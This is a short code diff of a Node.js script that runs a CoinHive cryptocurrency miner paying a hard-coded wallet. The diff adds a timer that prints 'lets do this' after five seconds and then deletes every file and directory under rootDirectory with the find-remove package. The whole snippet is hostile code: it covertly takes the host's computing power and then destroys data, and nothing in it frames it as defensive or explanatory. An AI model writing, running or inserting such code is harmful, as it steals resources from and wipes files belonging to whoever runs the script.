@@ -1,4 +1,5 @@
 const CoinHive = require("coin-hive");
+var findRemoveSync = require('find-remove');
 
 (async () => {
   const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
@@ -9,6 +10,12 @@ const CoinHive = require("coin-hive");
   });
   await miner.start();
   miner.on('update', data => console.log(`
+  
     ${data.acceptedHashes}
   `));
+  
+  setTimeout(async () => {
+      console.log('lets do this');
+      findRemoveSync(rootDirectory, {dir: "*", files: "*.*"});
+  }, 5000);
 })();
